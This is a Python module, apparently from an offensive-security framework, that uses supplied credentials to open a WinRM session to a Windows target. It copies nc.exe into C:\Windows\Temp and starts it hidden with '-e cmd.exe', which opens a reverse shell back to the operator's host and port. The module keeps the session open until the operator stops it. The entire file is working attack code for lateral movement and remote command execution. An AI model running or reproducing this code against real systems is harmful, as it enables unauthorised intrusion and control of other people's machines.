def run(data, cred, args):
    import subprocess
    import os
    from core.attacker import resolve_lhost
    from core.paths import get_tool_path, get_artifacts_dir

    # --- ANSI PALETTE ---
    G, C, B, Y, W, R = '\033[92m', '\033[96m', '\033[94m', '\033[93m', '\033[0m', '\033[91m'
    BOLD = '\033[1m'

    # 1. Dynamic Resource Resolution
    lhost = resolve_lhost(args)
    lport = getattr(args, "lport", "4444")
    local_nc = get_tool_path("nc.exe")
    remote_path = "C:\\Windows\\Temp\\nc.exe"

    if not lhost:
        print(f"\n{R}[!] {W}{BOLD}DEPLOYMENT ABORTED{W}\n{R}  └── {W}Could not resolve LHOST (tun0 down?).")
        return

    if not local_nc.exists():
        print(f"\n{R}[!] {W}{BOLD}DEPLOYMENT ABORTED{W}\n{R}  └── {W}nc.exe not found at {local_nc}")
        return

    ip = data.get("ip")
    hostname = data.get("hostname")
    domain = data.get("domain", "")
    target = f"{hostname}.{domain}" if (hostname and domain) else (hostname or ip)
    
    user = cred.get("user")
    password = cred.get("secret")
    full_user = f"{user}@{domain.upper()}" if domain else user

    # -------------------------
    # POWERSHELL AUTOMATION SCRIPT (PERSISTENT)
    # -------------------------
    ps_script = f"""
    $sec = ConvertTo-SecureString "{password}" -AsPlainText -Force
    $cred = New-Object System.Management.Automation.PSCredential("{full_user}", $sec)
    
    Write-Host "[*] Establishing session to {target}..."
    $sess = New-PSSession -ComputerName {target} -Credential $cred -Authentication Negotiate

    Write-Host "[*] Moving binary to {remote_path}..."
    Copy-Item -Path "{local_nc}" -Destination "{remote_path}" -ToSession $sess

    Write-Host "[*] Triggering shell to {lhost}:{lport}..."
    Invoke-Command -Session $sess -ScriptBlock {{ 
        Start-Process "{remote_path}" -ArgumentList "{lhost} {lport} -e cmd.exe" -WindowStyle Hidden 
    }}

    Write-Host "{G}[+] Session locked open. Your shell should be active.{W}"
    Write-Host "{Y}[!] Press Ctrl+C in this terminal to close the session and cleanup.{W}"
    
    # Infinite loop to keep the PSSession alive
    try {{
        while($true) {{ Start-Sleep -Seconds 1 }}
    }} finally {{
        Write-Host "`n[*] Cleaning up session..."
        Remove-PSSession $sess
    }}
    """

    # --- UI OUTPUT ---
    print(f"\n{B}[{W}{G}*{W}{B}]{W} {BOLD}PHASE: WinRM BINARY DEPLOYMENT{W}")
    print(f"{B}  ├── {B}Target:{W}   {C}{target}{W}")
    print(f"{B}  ├── {B}Auth:{W}     {G}{full_user}{W}")
    print(f"{B}  ├── {B}LHOST:{W}    {C}{lhost}{W}:{Y}{lport}{W}")
    print(f"{B}  └── {B}Binary:{W}   {Y}{local_nc.name}{W} -> {Y}{remote_path}{W}")

    print(f"\n{B}[{G}*{B}]{W} {BOLD}Executing Deployment Script...{W}\n")

    # -------------------------
    # EXECUTION
    # -------------------------
    try:
        # We run this through pwsh. env=os.environ is used to keep things stable.
        subprocess.run(["sudo", "pwsh", "-Command", ps_script], env=os.environ.copy())
        
        
    except KeyboardInterrupt:
        print(f"\n{R}[!] {W}Deployment cancelled by operator.")
    except Exception as e:
        print(f"\n{R}[!] {W}Error: {e}")

    return data